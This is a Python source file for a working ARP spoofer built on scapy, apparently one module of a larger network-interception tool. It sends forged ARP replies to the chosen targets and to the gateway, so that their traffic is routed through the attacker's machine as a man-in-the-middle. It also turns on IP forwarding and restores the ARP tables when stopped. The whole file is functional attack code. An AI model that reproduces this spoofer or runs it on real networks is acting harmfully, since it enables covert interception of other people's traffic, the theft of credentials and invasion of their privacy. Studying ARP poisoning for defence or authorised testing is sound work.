"""
ARP Spoofer — poisons ARP caches to route target traffic through us (MITM).
Runs in a background thread. Always restores ARP on stop.

Only used when config.network.mode == "active".
Requires root and IP forwarding enabled:
    echo 1 > /proc/sys/net/ipv4/ip_forward
"""
import logging
import threading
import time
from typing import Dict

log = logging.getLogger(__name__)


def _get_mac(ip: str, iface: str) -> str:
    """ARP-request an IP to get its MAC address."""
    from scapy.all import ARP, Ether, srp
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                 iface=iface, timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv.hwsrc
    return None


def _enable_ip_forward():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        log.info("IP forwarding enabled")
    except Exception as e:
        log.error("Could not enable IP forwarding: %s", e)


def _disable_ip_forward():
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
    except Exception:
        pass


class ARPSpoofer:
    """
    Continuously sends forged ARP replies to a set of target devices,
    making them send their traffic through our interface.
    """

    def __init__(self, interface: str, gateway_ip: str):
        self.interface   = interface
        self.gateway_ip  = gateway_ip
        self._targets: Dict[str, str] = {}   # ip → mac
        self._gateway_mac: str = None
        self._running    = False
        self._lock       = threading.Lock()
        self._thread     = None

    def start(self):
        if self._running:
            return
        from scapy.all import conf
        conf.iface = self.interface
        self._gateway_mac = _get_mac(self.gateway_ip, self.interface)
        if not self._gateway_mac:
            log.error("Cannot resolve gateway MAC for %s — ARP spoof aborted",
                      self.gateway_ip)
            return
        _enable_ip_forward()
        self._running = True
        self._thread  = threading.Thread(target=self._loop, daemon=True, name="arp-spoof")
        self._thread.start()
        log.info("ARP spoofer started (gateway %s / %s)", self.gateway_ip, self._gateway_mac)

    def stop(self):
        self._running = False
        self._restore_all()
        _disable_ip_forward()
        log.info("ARP spoofer stopped — ARP tables restored")

    def add_target(self, ip: str):
        mac = _get_mac(ip, self.interface)
        if mac:
            with self._lock:
                self._targets[ip] = mac
            log.debug("Spoofing %s (%s)", ip, mac)
        else:
            log.warning("Could not resolve MAC for %s — skipping", ip)

    def remove_target(self, ip: str):
        with self._lock:
            mac = self._targets.pop(ip, None)
        if mac:
            self._restore_target(ip, mac)

    def set_targets(self, ips):
        """Replace the entire target set."""
        with self._lock:
            old_ips = set(self._targets.keys())
        new_ips = set(ips)
        for ip in new_ips - old_ips:
            self.add_target(ip)
        for ip in old_ips - new_ips:
            self.remove_target(ip)

    # ── internal ──────────────────────────────────────────────────────────────

    def _loop(self):
        from scapy.all import ARP, send
        while self._running:
            with self._lock:
                targets = list(self._targets.items())
            for target_ip, target_mac in targets:
                try:
                    # Tell target: "I am the gateway"
                    send(
                        ARP(op=2, pdst=target_ip, hwdst=target_mac,
                            psrc=self.gateway_ip),
                        iface=self.interface, verbose=False
                    )
                    # Tell gateway: "I am the target"
                    send(
                        ARP(op=2, pdst=self.gateway_ip, hwdst=self._gateway_mac,
                            psrc=target_ip),
                        iface=self.interface, verbose=False
                    )
                except Exception as e:
                    log.warning("ARP send error for %s: %s", target_ip, e)
            time.sleep(2)

    def _restore_target(self, ip: str, mac: str):
        """Send 5 genuine ARP replies to undo our poison for one target."""
        try:
            from scapy.all import ARP, send
            send(
                ARP(op=2, pdst=ip, hwdst=mac,
                    psrc=self.gateway_ip, hwsrc=self._gateway_mac),
                count=5, iface=self.interface, verbose=False
            )
            send(
                ARP(op=2, pdst=self.gateway_ip, hwdst=self._gateway_mac,
                    psrc=ip, hwsrc=mac),
                count=5, iface=self.interface, verbose=False
            )
        except Exception as e:
            log.error("ARP restore failed for %s: %s", ip, e)

    def _restore_all(self):
        with self._lock:
            targets = list(self._targets.items())
        for ip, mac in targets:
            self._restore_target(ip, mac)
        log.info("Restored ARP for %d target(s)", len(targets))
